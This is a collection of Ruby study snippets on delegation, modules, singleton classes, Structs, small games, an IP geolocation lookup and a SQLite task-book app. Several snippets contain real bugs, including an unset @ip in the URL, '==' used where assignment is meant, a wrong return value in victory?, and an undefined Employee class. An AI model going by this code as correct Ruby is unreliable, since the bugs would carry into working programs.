  extend Forwardable
  attr_accessor :records

  def_delegators :@records, :size, :<<, :map
end


record = RecordCollection.new

pp record.records = [ 1, 2, 3 ]
pp record.size
pp record << 4
pp record.map { |element| element * 2 }





---




require 'forwardable'

class MyQueue
  extend Forwardable
  CONST = 1

  attr_reader :queue

  def initialize
    @queue = []
  end

  def_delegator :@queue, :push, :my_push
  def_delegator 'MyQueue::CONST', :to_i
end


new_queue = MyQueue.new

pp new_queue.my_push(42)
pp new_queue.queue
pp new_queue.to_i





---




require 'forwardable'

User = Struct.new(:first_name, :last_name)

class UserDecorator
  extend Forwardable

  def_delegators :@user, :first_name, :last_name

  def initialize user
    @user = user
  end

  def full_name
    "#{first_name} #{last_name}"
  end
end


decorated_user_1 = UserDecorator.new(User.new('John', 'Doe'))
decorated_user_2 = UserDecorator.new(User.new('Gor', 'Khachatryan'))

pp decorated_user_1.first_name
pp decorated_user_1.last_name
pp decorated_user_1.full_name





---




require 'forwardable'

User = Struct.new(:first_name, :last_name)

class UserDecorator
  extend Forwardable

  def_delegator :@user, :first_name, :personal_name
  def_delegator :@user, :last_name, :family_name

  def initialize user
    @user = user
  end

  def full_name
    "#{personal_name} #{family_name}"
  end
end


decorated_user = UserDecorator.new(User.new("John", "Doe"))

pp decorated_user.personal_name





---




module Modulle
  def speak_up input
    pp input.upcase
  end

  module ClassMethods
    def who_am_i
      pp 'i am ' + self.to_s
    end
  end

  def self.included base
    base.extend(ClassMethods)
  end
end



class Klass
  include Modulle
  who_am_i
end




pp klass = Klass.new.speak_up('Sarah')




pp Klass.who_am_i





---




class TestInstanceVariables
  @@class_variable           = 'BBQ'
  @class_instance_variable_1 = 'WTF'
  @class_instance_variable_2 = 'LOL'

  def self.class_method
    pp "@@class_variable           == #{@@class_variable           || 'nil'}"
    pp "@class_instance_variable_1 == #{@class_instance_variable_1 || 'nil'}"
    pp "@class_instance_variable_2 == #{@class_instance_variable_2 || 'nil'}"
    pp "@instance_variable         == #{@instance_variable         || 'nil'}"
  end

  def initialize
    @instance_variable         = 'omg'
    @class_instance_variable_1 = 'wtf'

    pp "@@class_variable           == #{@@class_variable           || 'nil'}"
    pp "@class_instance_variable_1 == #{@class_instance_variable_1 || 'nil'}"
    pp "@class_instance_variable_2 == #{@class_instance_variable_2 || 'nil'}"
    pp "@instance_variable         == #{@instance_variable         || 'nil'}"
  end

  def instance_method
    pp "@@class_variable           == #{@@class_variable           || 'nil'}"
    pp "@class_instance_variable_1 == #{@class_instance_variable_1 || 'nil'}"
    pp "@class_instance_variable_2 == #{@class_instance_variable_2 || 'nil'}"
    pp "@instance_variable         == #{@instance_variable         || 'nil'}"
  end
end


pp TestInstanceVariables.class_method


test_inatance_variables = TestInstanceVariables.new

pp test_inatance_variables


pp test_inatance_variables.instance_method


pp TestInstanceVariables.class_method





---




require "addressable/template"
require 'happymapper'
require 'net/http'


class Ipgeobase
  def self.lookup(ip)
    query = "fields=country,countryCode,city,lat,lon"
    lookup = URI.parse "http://ip-api.com/xml/#{ip}?#{query}"
    HappyMapper.parse Net::HTTP.get lookup
  end
end


pp ip_meta = Ipgeobase.lookup('83.169.216.199')

puts

p ip_meta.country
p ip_meta.country_code
p ip_meta.city
p ip_meta.lat
p ip_meta.lon





---




require "addressable/template"
require 'happymapper'
require 'net/http'

module Ipgeobase
  class << self
    def lookup(ip)
      lookup_query = "fields=country,countryCode,city,lat,lon"
      @lookup = URI.parse "http://ip-api.com/xml/#{@ip}?#{lookup_query}"
      HappyMapper.parse(Net::HTTP.get @lookup)
    end
  end
end


pp ip_meta = Ipgeobase.lookup('83.169.216.199')



pp ip_meta.country
pp ip_meta.country_code
pp ip_meta.city



ip_meta.lat
ip_meta.lon





---




require "addressable/template"
require 'happymapper'
require 'net/http'


module Ipgeobase
  def self.lookup(ip)
    lookup_query = 'fields=country,countryCode,city,lat,lon'
    @lookup      = URI.parse "http://ip-api.com/xml/#{@ip}?#{lookup_query}"

    pp Net::HTTP.get @lookup
  end

  def self.country
    country_query = 'fields=country'
    @country      = URI.parse "http://ip-api.com/xml/#{@ip}?#{country_query}"

    Net::HTTP.get @country_code
  end

  def self.country_code
    country_code_query = 'fields=countryCode'
    @country_code      = URI.parse "http://ip-api.com/xml/#{@ip}?#{country_code_query}"

    Net::HTTP.get @country_code
  end

  def self.city
    city_query = 'fields=city'
    @city      = URI.parse "http://ip-api.com/xml/#{@ip}?#{city_query}"

    Net::HTTP.get @city
  end

  def self.lat
    lat_query = 'fields=lat'
    @lat      = URI.parse "http://ip-api.com/xml/#{@ip}?#{lat_query}"

    Net::HTTP.get @lat
  end

  def self.lon
    lon_query = 'fields=lon'
    @lon      = URI.parse "http://ip-api.com/xml/#{@ip}?#{lon_query}"

    Net::HTTP.get @lon
  end
end


ip_meta = Ipgeobase.lookup('83.169.216.199')



pp ip_meta.country
pp ip_meta.country_code
pp ip_meta.city
pp ip_meta.lat
pp ip_meta.lon





---




require "addressable/template"
require 'happymapper'
require 'net/http'


class << self
  def lookup(ip)
    lookup_query = "fields=country,countryCode,city,lat,lon"
    @lookup = URI.parse "http://ip-api.com/xml/#{@ip}?#{lookup_query}"
    HappyMapper.parse(Net::HTTP.get @lookup)
  end
end


ip_meta = lookup '83.169.216.199'



pp ip_meta



ip_meta.country



pp ip_meta.country_code
pp ip_meta.city
pp ip_meta.lat
pp ip_meta.lon





---




require "addressable/template"
require 'happymapper'
require 'net/http'

module Ipgeobase
  class << self
    def lookup(ip)
      lookup_uri = Addressable::Template.new("http://{host}{/segments*}{?fields}").expand({
        'host'     => 'ip-api.com',
        'segments' => ['xml', "#{ip}"],
        'fields'   => 'country,countryCode,city,lat,lon'
      })

      lookup_xml = Net::HTTP.get lookup_uri
      HappyMapper.parse lookup_xml
    end
  end
end


# ip_meta = Ipgeobase.lookup('83.169.216.199')
ip_meta = Ipgeobase.lookup('81.200.23.8')



pp ip_meta



pp ip_meta.country
pp ip_meta.city
pp ip_meta.country_code
pp ip_meta.lat
pp ip_meta.lon



# p ip_meta.instance_variable_get '@country'
# puts '-' * 90
# puts 'ip_meta.class.ancestors'
# pp ip_meta.class.ancestors
# puts '-' * 90
# puts 'ip_meta.class.instance_variables'
# pp ip_meta.class.instance_variables
# puts '-' * 90
# puts 'ip_meta.class.class_variables'
# pp ip_meta.class.class_variables
# puts '-' * 90
# puts 'ip_meta.class.instance_methods'
# pp ip_meta.class.instance_methods
# puts '-' * 90
# puts 'ip_meta.class.elements'
# pp ip_meta.class.elements
# puts '-' * 90
# puts 'ip_meta.instance_variables'
# pp ip_meta.instance_variables.join(' ').split(' ')
# puts '-' * 90

# pp ip_meta.send :city
# puts '-' * 90
# pp ip_meta.instance_eval 'lat'
# puts '-' * 90





---




class Cat
  attr_accessor :name

  def initialize string
    name = string
  end
end


cat = Cat.new("Kit")

pp cat.name





---




require 'date'

module Model
  def initialize(attrs = {})
    @attributes = {}

    self.class.attribute_options.each do |name, options|
      value = attrs.key?(name) ? attrs[name] : options.fetch(:default, nil)
      write_attribute(name, value)
    end
  end

  def write_attribute(name, value)
    options = self.class.attribute_options[name]
    @attributes[name] = self.class.convert(value, options[:type])
  end

  module ClassMethods
    def attribute_options
      @attribute_options || {}
    end

    def attribute(name, options = {})
      @attribute_options ||= {}
      @attribute_options[name] = options

      define_method "#{name}" do
        @attributes[name]
      end

      define_method "#{name}=" do |value|
        write_attribute(name, value)
      end

      def convert(value, target_type)
        return value if value.nil?

        case target_type
        when :datetime
          DateTime.parse value
        when :string
          String value
        when :integer
          Integer value
        when :boolean
          !!value
        end
      end
    end
  end

  def self.included(base)
    base.attr_reader :attributes
    base.extend(ClassMethods)
  end
end





require_relative './class_metapro_model.rb'
require 'date'

class Post
  include Model

  attribute :id,         type: :integer
  attribute :title,      type: :string
  attribute :body,       type: :string
  attribute :created_at, type: :datetime
  attribute :published,  type: :boolean
end

post = Post.new(
  id:         '1',
  title:      'First Post',
  body:       'Hello, World!',
  created_at: '01/03/2021',
  published:  'true'
)




pp post.id
pp post.title
pp post.body
pp post.created_at
pp post.published



pp post



pp post.id         = '2'
pp post.title      = 'Second Post'
pp post.body       = 'Goodbye, World!'
pp post.created_at = '10/05/2020'
pp post.published  = 'false'



pp post.attributes



pp post_2 = Post.new(id: '2')



pp post_2.id = '3'
pp post_2









require_relative './class_metapro_model'

class User
  include Model

  attribute :name,     type: :string,   default: 'Andrey'
  attribute :active,   type: :boolean,  default: false
  attribute :birthday, type: :datetime
end

pp user = User.new(
  name:     'Ivan',
  birthday: '03/02/1987',
  active:   'true'
)




pp user.attributes




pp user_2 = User.new

pp user_2.name
pp user_2.birthday
pp user_2.active



pp user_2.attributes






---




require 'forwardable'

class Computer
  extend Forwardable

  def_delegators :@memory, :read, :write

  def initialize
    @memory = Memory.new
  end

  # def write data
  #   @memory.write data
  # end

  # def read index
  #   @memory.read index
  # end
end

class Memory
  def initialize
    @data = []
  end

  def write data
    @data << data
  end

  def read index
    @data[index]
  end
end


pp computer = Computer.new



pp computer.write 'Ruby'
pp computer
pp computer.read 0





---




class Truck
  attr_accessor :make, :year

  def self.default_make
    pp "Toyota"
  end

  def make
    pp @make || self.class.default_make
  end

  def initialize(make=nil, year=nil)
    self.year, self.make = year, make
  end
end



first_truck = Truck.new("Honda", 2000)

first_truck.make
first_truck.year



second_truck = Truck.new

second_truck.make
second_truck.year





---




module RandomEngine
  def self.get_random_value
    rand(100..999)
  end
end

class GameEngine
  def self.play
    a = RandomEngine.get_random_value
  end
end

pp GameEngine.play
pp RandomEngine.inspect





---




class Cat
  def self.my_attr_accessor *attributes
    attributes.each do |attribute|
      define_method "#{attribute}" do
        self.instance_variable_get "@#{attribute}"
      end
      define_method "#{attribute}=" do |value|
        self.instance_variable_set"@#{attribute}", value
      end
    end
  end

  my_attr_accessor :name, :age, :weight

  def initialize(name, age, weight)
    @name, @age, @weight = name, age, weight
  end
end

cat = Cat.new 'Kitty', 4, 23

pp cat
pp cat.name
pp cat.age
pp cat.weight





---




class Cage
  attr_accessor :creature

  def initialize(creature = nil)
    self.creature = creature # We forget to set a default!
  end

  def rawr
    creature.rawr
  end
end

pp cage = Cage.new
pp cage.rawr # => NoMethodError: undefined method `rawr' for nil:NilClass



class Creature
end

pp creature = Creature.new
pp creature.rawr # => NoMethodError: undefined method `rawr' for #<Creature:0x0055e6fb99e390>



class Creature
  def rawr
    'rawr!'
  end
end

pp creature = Creature.new

def creature.rawr
  'raaaaawr!'
end

pp creature.rawr # => 'raaaaawr!'



module LoudCreature
  def rawr
    'raaaaawr!'
  end
end


pp creature = Creature.new
pp creature.extend(LoudCreature)
pp creature.rawr # => 'raaaaawr!'



module QuietCreature
  def rawr
    'purrrrr :3'
  end
end

pp creature = Creature.new

pp creature.extend(LoudCreature)
pp creature.extend(QuietCreature)
pp creature.rawr # => 'purrrrr :3'



pp creature = Creature.new
pp creature.rawr # => 'rawr!'



class Creature
  include LoudCreature
  include QuietCreature
end

pp creature = Creature.new
pp creature.rawr # => 'purrrrr :3'



class Creature
  prepend LoudCreature

  def rawr
    'rawr!'
  end
end

pp creature = Creature.new
pp creature.rawr # => 'raaaaawr!'



class Beast
  def rawr
    'hurrrrrrrr!'
  end
end

class Creature < Beast
  # Method defined on superclass
end

pp creature = Creature.new
pp creature.rawr # => 'hurrrrrrrr!'



class Creature
  def method_missing(method, *args, &block)
    "I haven't learned to #{method} yet :("
  end
end

pp creature = Creature.new

pp creature.rawr # => "I haven't learned to rawr yet :("
pp creature.rawor # => "I haven't learned to rawor yet :("



module Beast
  def method_missing(method, *args, &block)
    "I haven't learned to #{method} yet :("
  end
end

class Creature
  include Beast
end

pp creature = Creature.new
pp creature.rawr # => "I haven't learned to rawr yet :("





---




class PaginationHelper
  attr_reader :collection, :size

  def initialize(collection, items_per_page)
    @collection = collection
    @size       = items_per_page
  end

  def item_count
    collection.size
  end

  def page_count
    (item_count / size.to_f).ceil
  end

  def page_item_count(page_index)
    len = collection[size * page_index...size * page_index + size]
    return -1 if len.nil?
    return -1 if page_index > page_count || page_index < 0

    len.size
  end

  def page_index(item_index)
    return -1 if item_index > item_count || item_index < 0

    item_index / size
  end
end


pp helper = PaginationHelper.new(%w[a b c d e f], 4)

pp helper.page_count()
pp helper.item_count() == 6
pp helper.page_item_count(0) == 4
pp helper.page_item_count(1) == 2
pp helper.page_item_count(2) == -1

pp helper.page_index(5) == 1
pp helper.page_index(2) == 0
pp helper.page_index(20) == -1
pp helper.page_index(-10) == -1

# assert(helper.page_count() == 2)
# assert(helper.item_count() == 6)
# assert(helper.page_item_count(0) == 4)
# assert(helper.page_item_count(1) == 2)
# assert(helper.page_item_count(2) == -1)
#
# assert(helper.page_index(5) == 1)
# assert(helper.page_index(2) == 0)
# assert(helper.page_index(20) == -1)
# assert(helper.page_index(-10) == -1)





---




class Person
  @@people_count = 0

  def initialize(name)
    @name = name
    @@people_count += 1
  end

  def self.number_of_instances
    @@people_count
  end
end

matz = Person.new("Yukihiro")
dhh = Person.new("David")

pp "Number of Person instances: #{Person.number_of_instances}"





---




class Robot
  attr_accessor :x, :y

  def initialize options = {}
    @x = options[:x] || 0
    @y = options[:y] || 0
  end

  def right; self.x += 1; end
  def left;  self.x -= 1; end
  def up;    self.y += 1; end
  def down;  self.y -= 1; end
  def label; ' * ';       end
end



class Dog
  attr_accessor :x, :y

  def initialize options = {}
    @x = options[:x] || 0
    @y = options[:y] || 0
  end

  def right; self.x += 1; end
  def left;  self.x -= 1; end
  def up;    self.y += 1; end
  def down;  self.y -= 1; end
  def label; ' @ ';       end
end



class Commander
  def move who
    move = %i[right left up down].sample
    who.send move
  end
end



commander = Commander.new
array     = Array.new(10) { Robot.new }

array.push(Dog.new x: -12, y: 12)

10.times do
  pp "\e[H\e[2J"

  12.downto(-12) do |y|
    -12.upto(12) do |x|
      someday = array.find { |somebody| somebody.x == x && somebody.y == y }
      someday ? (print someday.label) : (print ' . ')
    end; puts
  end

  game_over = array.combination(2).any? do |a, b|
    a.x == b.x && \
    a.y == b.y && \
    a.label != b.label
  end

  if game_over
    pp 'Game over'
    exit
  end

  array.each do |somebody|
    commander.move somebody
  end
  sleep 0.1
end





---




class Robot
  attr_accessor :x, :y

  def initialize options = {}
    @x = options[:x] || 0
    @y = options[:y] || 0
  end

  def right; self.x += 1; end
  def left;  self.x -= 1; end
  def up;    self.y += 1; end
  def down;  self.y -= 1; end
end


class Commander
  def move who
    move = %i[right left up down].sample
  end
end

commander = Commander.new
array     = Array.new(10) { Robot.new }

10.times do
  pp "\e[H\e2J"

  12.downto(-12) do |y|
    -30.upto(30) do |x|
      found = array.any? { |robot| robot.x == x && robot.y == y }
      found ? (print ' * ') : (print ' . ')
    end; puts
  end

  array.each do |robot|
    commander.move robot
  end
  sleep 0.1
end





---




@array_1 = Array.new(10, 1)
@array_2 = Array.new(10, 1)

def attack array
  sleep 0.5
  index = rand 0..9

  if array[index] == 1
    array[index] == 0
    pp "Robot with index #{index} destroyed"
  else
    pp 'No destroyed robots'
    sleep 0.3
  end
end

def victory?
  robots_left_1 = @array_1.count { |element| element == 1 }
  robots_left_2 = @array_2.count { |element| element == 1 }

  if robots_left_1 == 0
    pp "Team 2 wins, stay alive #{robots_left_2} robots"
    return true
  end

  if robots_left_2 == 0
    pp "Team 1 wins, stay alive #{robots_left_1} robots"
    return false
  end
end

def stats
  count_1 = @array_1.count { |element| element == 1 }
  count_2 = @array_2.count { |element| element == 1 }

  puts "First robots team: #{count_1} robots ready"
  puts "Second robots team: #{count_2} robots ready"
end

10.times do
  puts 'First team attack...'
  attack @array_2
  exit if victory?
  stats
  sleep 1
  puts

  puts 'Second team attack...'
  attack @array_1
  exit if victory?
  stats
  sleep 1
end





---




string      = "Madam, I'm Adam"
temp_string = string.gsub(/\W/, '').downcase

temp_string.reverse.equal? string.gsub(/\W/, '').downcase ? (pp 'yes') : (pp 'no')




class String
  def palindrome?
    self.gsub(/\W/, '').downcase.reverse == self.gsub(/\W/, '').downcase
  end
end

string.palindrome? ? (pp 'yes') : (pp 'no')





def string.palindrome?
  self.gsub(/\W/, '').downcase.reverse == self.gsub(/\W/, '').downcase
end

string.palindrome? ? (pp 'yes') : (pp 'no')




pp string.singleton_class
pp string.singleton_class.instance_methods[0..5]





---




module Kernel
  def kernel_method
    pp 'hi from kernel'
  end
end

TEST = 'main namespace'

module NameSpace
  class Animal
    TEST = 'my constant'

    def initialize name
      @name = name
    end

    def hello
      pp "Hello my name is #{@name}"
      kernel_method
    end

    def hey; puts ::TEST; end
  end
end


klass = NameSpace::Animal
pp klass



object = klass.new('test')
pp object



pp NameSpace::Animal::TEST
pp klass::TEST



pp TEST



pp object.hello
pp object.hey



pp klass.class
pp klass.class.superclass
pp klass.class.superclass.superclass
pp klass.class.superclass.superclass.superclass
pp klass.class.superclass.superclass.superclass.superclass



pp object.class
pp object.class.superclass
pp object.class.superclass.superclass
pp object.class.superclass.superclass.superclass





---




require 'selenium-webdriver'
require 'cgi'

module UrlGenerator
  def prepare_uri string
    CGI.escape string
  end
end


class Animal
  # include UrlGenerator - prepare_uri() don't work for class (only: Animal.new.prepare_uri) !!!
  # exitend UrlGenerator - prepare_uri() will work for class
  attr_accessor :name

  def initialize name
    @name = name
  end

  class << self
    include UrlGenerator # will work

    def find(term = '')
      driver    = Selenium::WebDriver.for :firefox
      full_term = self.prepare_uri term + " " + self.name.downcase

      driver.get "https://ddg.gg/?q=#{full_term}"
    end
  end

  def hi
    pp "Hi, my name is #{@name}"
  end
end


class Cat < Animal
  class << self
    attr_accessor :avg_height
  end
end



pp Animal.singleton_class



pp Animal.singleton_class.instance_methods.respond_to? :find
pp Animal.singleton_class.instance_methods.grep /fin/



pp Cat.singleton_class
pp Cat.singleton_class.superclass
pp Cat.singleton_class.instance_methods.respond_to? :find
pp Cat.singleton_class.instance_methods.grep /fin/



pp Cat.avg_height = 20





---




class Manager
  def self.say_hi
    pp 'Hi'
  end
end

class Hipster
  def self.say_hi
    pp 'Hey yo'
  end
end

class Jessie_Pinckman
  def self.say_hi
    pp 'Hi, bitch'
  end
end

Manager.say_hi
Hipster.say_hi
Jessie_Pinckman.say_hi





---




class RandomEngine
  def self.get_random_value
    rand(100..999)
  end
end

class GameEngine
  def self.play
    round = RandomEngine.get_random_value
  end
end



pp GameEngine.play





---




cat = String.new 'cat'

def cat.speak
  'miaow'
end

pp cat.speak
pp cat.singleton_methods




One = Class.new

def One.speak
  "I'm class One"
end

pp One.speak
pp One.singleton_methods




class One
  def self.classs_method
    'in One#classs_method'
  end
end

pp One.singleton_methods
pp One.classs_method
pp One.speak





class Two
  def self.classs_method
    true
  end

  def instancce_method
    true
  end
end

pp Two.classs_method
pp Two.new.instancce_method





module Modulle
  def self.classs_method
    true
  end

  def iinstancce_method
    true
  end
end


pp Modulle.classs_method





---




class Zen
end

zen_1 = Zen.new
zen_2 = Zen.new

class << zen_1
  def say_hello
    pp 'hey'
  end
end

zen_1.say_hello




class Hi
  self
  class << self
    self
    self == Hi.singleton_class
  end
end

hi = String.new

def hi.methodd
end

pp hi.class.instance_methods.include? :methodd
pp hi.singleton_class.instance_methods.include? :methodd




class SomeClass
  class << self
    def test_1
    end
  end
end

test_object = SomeClass.new

def test_object.test_2
end

class << test_object
  def test_3
  end
end

pp "Singleton's methods of SomeClass"
pp SomeClass.singleton_methods

pp "Singleton's methods of test_object"
pp test_object.singleton_methods





---




class Manager
  @@all = []
  attr_accessor :name, :department, :age

  def initialize name, department, age
    @name, @department, @age = name, department, age
    @@all << self
  end

  def self.all
    @@all
  end

  def employees
    Employee.all.select { |employee| employee.manager == self }
  end

  def self.all_department
    self.all.map { |manager| manager.department }.uniq
  end
end



yu     = Manager.new 'Yu', 'Accounting', 34
ted    = Manager.new 'Ted', 'Accounting', 35
bob    = Manager.new 'Bob', 'HR', 22
sandra = Manager.new 'Sandra', 'Designe', 54

pp Manager.all
pp Manager.all_department
pp self


ben   = Employee.new 'Ben', 25000, yu, project_manager
lisa  = Employee.new 'Lisa', 100000, lisa, designer
mark  = Employee.new 'Mark', 50000, mark, copywriter
sally = Employee.new 'Sally', 60000, sally, coffee_maker

yu.employees





---





class Person
  attr_reader :age

  def self.species
    pp '35'
  end

  def initialize age
    @age = age
  end

  def say_hello
    pp "I am #{@age}"
  end
end


bob = Person.new('32')

pp Person.species

pp bob.say_hello
pp bob.class.species
pp bob.age





---




Customer = Struct.new(:name, :address) do
  def greeting
    "Hello #{name}"
  end
end

dave = Customer.new('Dave', '123 Main')
pp dave



pp dave.name
pp dave.address
pp dave.greeting



pp dave.members





---



structs
-------



pp Struct.new("Customer", :name, :address)
pp Struct::Customer.new("Dave", "123 Main")

pp Customer = Struct.new(:name, :address)
pp Customer.new("Eric", "321 Secondary")





---





pp AnotherCustomer = Struct.new(:name, :address, keyword_init: true)
pp AnotherCustomer.new(name: "Dave", address: "123 Main")






---


ThirdCustomer = Struct.new(:name, :address) do
  def greeting
    "Hello #{name}!"
  end
end

pp ThirdCustomer.new("Third Customer", "123 Main").greeting





---





pp SecondCustomer = Struct.new(:name, :address)
pp SecondCustomer.new("Dave", "123 Main")

pp SecondCustomer["Dave"]
pp SecondCustomer["John"]





---





pp FirstCustomer = Struct.new(:name, :address, :zip)
pp joe   = FirstCustomer.new("Joe Smith", "123 Maple, Anytown NC", 12345)
pp joejr = FirstCustomer.new("Joe Smith", "123 Maple, Anytown NC", 12345)
pp jane  = FirstCustomer.new("Jane Doe", "456 Elm, Anytown NC", 12345)

pp joe == joejr
pp joe == jane





---





pp LastCustomer = Struct.new(:name, :address, :zip)
pp joe = LastCustomer.new("Joe Smith", "123 Maple, Anytown NC", 12345)

pp joe["name"]
pp joe[:name]
pp joe[0]




---





pp GreatCustomer = Struct.new(:name, :address, :zip)
pp joe = GreatCustomer.new("Joe Smith", "123 Maple, Anytown NC", 12345)

pp joe["name"] = "Luke"
pp joe[:zip]   = "90210"

pp joe.name
pp joe.zip




---





pp BigCustomer = Struct.new(:name, :address, :zip)
pp joe = BigCustomer.new("Joe Smith", "123 Maple, Anytown NC", 12345)

pp joe.to_a[1]




---





pp Foo = Struct.new(:a)
pp f = Foo.new(Foo.new({b: [1, 2, 3]}))

pp f.dig(:a, :a, :b, 0)
pp f.dig(:b, 0)




---





pp EachCustomer = Struct.new(:name, :address, :zip)
pp joe = EachCustomer.new("Joe Smith", "123 Maple, Anytown NC", 12345)

pp joe.each { |x| puts x }
pp joe.length
pp joe.members
pp joe.to_a[1]




---





pp PairCustomer = Struct.new(:name, :address, :zip)
pp joe = PairCustomer.new("Joe Smith", "123 Maple, Anytown NC", 12345)

pp joe.each_pair { |name, value| puts("#{name} => #{value}") }




---





pp SelectLots = Struct.new(:a, :b, :c, :d, :e, :f)
pp l = SelectLots.new(11, 22, 33, 44, 55, 66)

pp l.select { |v| v.even? }




---





pp HashCustomer = Struct.new(:name, :address, :zip)
pp joe = HashCustomer.new("Joe Smith", "123 Maple, Anytown NC", 12345)

pp joe.to_h[:address]
pp joe.to_h{ |name, value| [name.upcase, value.to_s.upcase] }[:ADDRESS]




---





pp ValuesCustomer = Struct.new(:name, :address, :zip)
pp joe = ValuesCustomer.new("Joe Smith", "123 Maple, Anytown NC", 12345)

pp joe.values_at(0, 2)





---




class Message
  @@messages_sent = 0

  def initialize from, to
    @from, @to = from, to
    @@messages_sent += 1
  end
end

class Email < Message
  def initialize from, to
    super
  end
end



my_message = Message.new('Ian', 'Alex')
pp my_message





---




class Link < Post
  def initialize
    super

    @url = ''
  end

  def read_from_console
    puts 'Link address: '
    @url = STDIN.gets.chomp

    puts "Add '#{@url}' overview: "
    @text = STDIN.gets.chomp
  end

  def to_strings
    time_string = "Created #{@created_at.strftime("%Y-%m-%d %H:%M:%S")} \n\r \n\r"

    return [ @url, @text, time_string ]
  end

  def to_db_hash
    return super.merge(
      {
        'text': @text,
        'url':  @url
      }
    )
  end

  def load_data(data_hash)
    super(data_hash)

    @url = data_hash['url']
  end
end





---




require_relative 'class_task_book_post.rb'
require_relative 'class_task_book_link.rb'
require_relative 'class_task_book_memo.rb'
require_relative 'class_task_book_task.rb'

puts 'Wellcome'
puts 'Add task'

choices = Post.post_types.keys
choice  = -1

until choice >= 0 && choice < choices.size
  choices.each_with_index do |type, index|
    pp "\t#{index}. #{type}"
  end

  choice = STDIN.gets.chomp.to_i
end

entry = Post.create(choices[choice])

entry.read_from_console
id = entry.save_to_db

pp "New task created, id = #{id}"





class Memo < Post
  def read_from_console
    puts 'New post (write "end" word for end your post): '

    line = nil
    @text = []

    while line != 'end' do
      line = STDIN.gets.chomp
      @text << line
    end

    @text.pop
  end

  def to_strings
    time_string = "Created #{@created_at.strftime("%Y-%m-%d %H:%M:%S")} \n\r \n\r"
    return @text.unshift(time_string)
  end

  def to_db_hash
    return super.merge(
      {
        'text': @text.join('\n\r')
      }
    )
  end

  def load_data(data_hash)
    super(data_hash)

    @text = data_hash['text'].split('\n\r')
  end
end





require 'sqlite3'

class Post
  @@SQLITE_DB_FILE = 'sqlite/task_book.sqlite'

  def self.post_types
    { 'Memo': Memo, 'Link': Link, 'Task': Task }
  end

  def self.create type
    return post_types[type].new
  end

  def self.find(limit, type, id)
    db = SQLite3::Database.open(@@SQLITE_DB_FILE)

    unless id.nil?
      db.results_as_hash = true

      result = db.execute('SELECT * FROM Posts WHERE id = ?', id)
      result = result[0] if result.is_a? Array

      db.close

      if result.empty?
        pp "Id #{id} not exists"
        return nil
      else
        # post = create(result['type'])
        # post.load_data(result)
        # return post
        result
      end
    end
  end

  def initialize
    @created_at = Time.now
    @text = nil
  end

  def read_from_console; end
  def to_strings; end

  def save
    file = File.new(file_path, 'w:UTF-8')

    for item in to_strings do
      file.puts(item)
    end
    file.close
  end

  def file_path
    file_path = 'text_files'
    file_name = @created_at.strftime("#{self.class.name}_%Y_%m_$d_%H_%M_%S.txt")

    return file_path + '/' + file_name
  end

  def save_to_db
    db = SQLite3::Database.open(@@SQLITE_DB_FILE)
    db.results_as_hash = true

    db.execute(
      "CREATE TABLE IF NOT EXISTS Posts (
        id INTEGER PRIMARY KEY,
        type TEXT,
        created_at DATETIME,
        text TEXT,
        url TEXT,
        due_date DATETIME
      )")

    db.execute(
      "INSERT INTO Posts (" +
      to_db_hash.keys.join(', ') +
      ")" +
      " VALUES (" +
      ('?,' * to_db_hash.size).chomp(',') +
      ")",
      to_db_hash.values
    )

    insert_row_id = db.last_insert_row_id
    db.close
    return insert_row_id
  end

  def to_db_hash
    {
      'type':       self.class.name,
      'created_at': @created_at.to_s
    }
  end

  def load_data(data_hash)
    @created_at = Time.parse(data_hash['created_at'])
  end
end





require_relative 'class_task_book_post.rb'
require_relative 'class_task_book_link.rb'
require_relative 'class_task_book_memo.rb'
require_relative 'class_task_book_task.rb'

require 'optparse'

options = {}

OptionParser.new do |opt|
  opt.banner = 'Usage: read.rb [options]'

  opt.on('-h', 'Prints this help') do
    puts opt
    exit
  end

  opt.on('--type POST_TYPE', 'Type of (default any)') { |o| options[:type] = o }
  opt.on('--id POST_ID', 'If get id - show by id') { |o| options[:id] = o }
  opt.on('--limit NUMBER', 'Limit output') { |o| options[:limit] = o }
end.parse!

result = Post.find(
  options[:limit],
  options[:type],
  options[:id]
)

if result.is_a? Post
  puts "Record: #{result.class.name}, id: #{options[:id]}"

  result.to_strings.each do |line|
    puts line
  end
else
  puts "id\t @type\t @created_at\t\t\t @text\t\t\t @url\t\t @due_date\t"

  result.each do |row|
    puts
    row.each do |element|
      print "| #{element.to_s.delete("\\n\\r")[0..40]}\t"
    end
  end
end





require 'date'

class Task < Post
  def initialize
    super

    @due_date = Time.now
  end

  def read_from_console
    puts'"What todo? '
    @text = STDIN.gets.chomp

    puts 'When it must be done?'
    puts "Add date in format 'DD.MM.YY': "
    input = STDIN.gets.chomp

    @due_date = Date.parse(input)
  end

  def to_strings
    time_string = "Created #{@created_at.strftime("%Y-%m-%d %H:%M:%S")} \n\r \n\r"
    deadline    = "Deadline #{@due_date}"

    return [ deadline, @text, time_string ]
  end

  def to_db_hash
    return super.merge(
      {
        'text':     @text,
        'due_date': @due_date.to_s
      }
    )
  end

  def load_data(data_hash)
    super(data_hash)

    @due_date = Date.parse(data_hash['due_date'])
  end
end





---




next_day.rb
-----------


require 'time'

def next_day
  today = Date.today
  tomorrow = today.next
  Time.new tomorrow.year, tomorrow.month, tomorrow.day
end



pp next_day





---




require 'forwardable'
require 'uri'

class Url
  extend Forwardable
  include Comparable

  def_delegators :@uri, :scheme, :host, :to_s, :query

  def initialize(uri, params = {})
    @uri = URI(uri)

    if @uri.to_s.include?('?')
      @params = @uri.query.split('&').each_with_object({}) do |item, hash|
        hash[item.split('=')[0].to_sym] = item.split('=')[1]
      end
    else
      @params = {}
    end
  end

  def query_params
    @params
  end

  def query_param(key, value = nil)
    @params.fetch(key, value)
  end

  def <=>(other)
    to_s <=> other
  end
end





---




require 'forwardable'
require 'uri'

class Url
  extend Forwardable
  include Comparable

  def_delegators :@uri, :scheme, :host, :to_s, :query, :decode_www_form

  def initialize(uri)
    @uri = URI(uri)
  end

  def query_params
    if @uri.to_s.include?('?')
      # @params = uri.query.split('&').map { |el| el.split('=') }.each_with_object({}) do |item, hash|
      #             hash[item[0].to_sym] = item[1]
      #           end
      @params = @uri.query.split('&').each_with_object({}) do |item, hash|
        hash[item.split('=')[0].to_sym] = item.split('=')[1]
      end
    else
      @params = {}
    end
  end

  def query_param(key, value = nil)
    query_params
    @params.fetch(key.to_sym, value)
  end

  def <=>(other)
    @uri <=> other
  end
end


yandex_url = Url.new 'http://yandex.ru?key=value&key2=value2'
google_url = Url.new 'https://google.com:80?a=b&c=d&lala=value'

pp yandex_url
pp yandex_url.query
pp yandex_url.query_params
pp yandex_url == google_url # false





